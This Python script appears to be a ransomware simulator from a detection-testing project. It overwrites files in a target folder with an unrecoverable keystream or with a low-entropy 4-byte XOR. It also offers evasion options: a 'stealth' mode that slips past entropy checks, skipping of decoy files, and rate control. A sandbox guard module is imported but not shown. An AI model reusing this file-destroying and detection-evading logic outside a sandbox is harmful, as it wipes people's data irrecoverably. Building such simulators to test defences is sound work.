#!/usr/bin/env python3
"""ransomware_v2: a HARMLESS test tool, the "look-alike" variant (XOR instead of pure noise).

Default  : scrambles each file with a SHA-256 keystream. The output looks random
           (entropy ~8), so Rewind's entropy check CAN see it.
--weak   : XORs with a 4-byte repeating key. The output keeps most of the text's
           structure (entropy stays well below 7.5), so only the SPEED signal fires:
           the "stealth" variant that tests the sustained-suspicion rule and the
           known_good protections.
It REFUSES to run anywhere except a marked sandbox (see _sandbox_guard.py).

  --rate N         files per second (default 12)       --limit N       stop after N files
  --hold SECONDS   keep each file open this long       --target PATH   folder to attack
                   after writing it (default 0.04)     --avoid-decoys  skip the !DECOY_ files
"""
import argparse
import hashlib
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
sys.path.insert(0, HERE)

import config                      # noqa: E402
import _sandbox_guard as guard     # noqa: E402

WEAK_KEY = bytes([0x5A, 0xC3, 0x17, 0x9E])    # pinned by tests; matches the regression tests


def weak_xor(data):
    """XOR with the 4-byte key repeated over and over."""
    return bytes(b ^ WEAK_KEY[i % 4] for i, b in enumerate(data))


def keystream(key, nonce, length):
    """`length` pseudo-random bytes: SHA-256 run in counter mode."""
    out, counter = bytearray(), 0
    while len(out) < length:
        block = key + nonce.to_bytes(8, "big") + counter.to_bytes(8, "big")
        out += hashlib.sha256(block).digest()
        counter += 1
    return bytes(out[:length])


def strong_xor(data, key, nonce):
    """XOR with a keystream: the result looks like random noise."""
    return bytes(a ^ b for a, b in zip(data, keystream(key, nonce, len(data))))


def scramble_file(path, transform, hold):
    """Overwrite a file in place (same size) and keep it open for `hold` seconds."""
    with open(path, "r+b") as f:
        data = f.read()
        f.seek(0)
        f.write(transform(data))
        f.flush()
        if hold > 0:
            time.sleep(hold)         # "the encryption work takes time"


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Harmless ransomware simulator (v2, XOR).")
    p.add_argument("--target", default=config.PROTECTED_DIR)
    p.add_argument("--weak", action="store_true", help="4-byte repeating key (entropy stays low)")
    p.add_argument("--rate", type=float, default=12.0)
    p.add_argument("--hold", type=float, default=0.04)
    p.add_argument("--avoid-decoys", action="store_true")
    p.add_argument("--limit", type=int, default=None)
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    if args.rate <= 0:
        print("--rate must be above 0")
        return 2
    try:
        target = guard.validate_target(args.target)
    except guard.SandboxViolation as err:
        print("REFUSING TO RUN: %s" % err)
        return 2
    files = guard.safe_files(target, args.avoid_decoys)
    if args.limit is not None:
        files = files[:max(0, args.limit)]
    interval = 1.0 / args.rate
    hold = min(args.hold, interval * 0.8)
    key = os.urandom(32)                       # a fresh secret key for every run
    mode = "weak (4-byte repeating key)" if args.weak else "strong (keystream)"
    print("ransomware_v2 (harmless test tool, %s): attacking %d files in %s"
          % (mode, len(files), target), flush=True)
    done = 0
    for index, path in enumerate(files):
        transform = weak_xor if args.weak else (lambda data, n=index: strong_xor(data, key, n))
        started = time.time()
        try:
            scramble_file(path, transform, hold)
        except OSError as err:
            print("skipped %s: %s" % (os.path.basename(path), err), flush=True)
            continue
        done += 1
        rest = interval - (time.time() - started)
        if rest > 0:
            time.sleep(rest)
    print("finished: %d files overwritten" % done, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
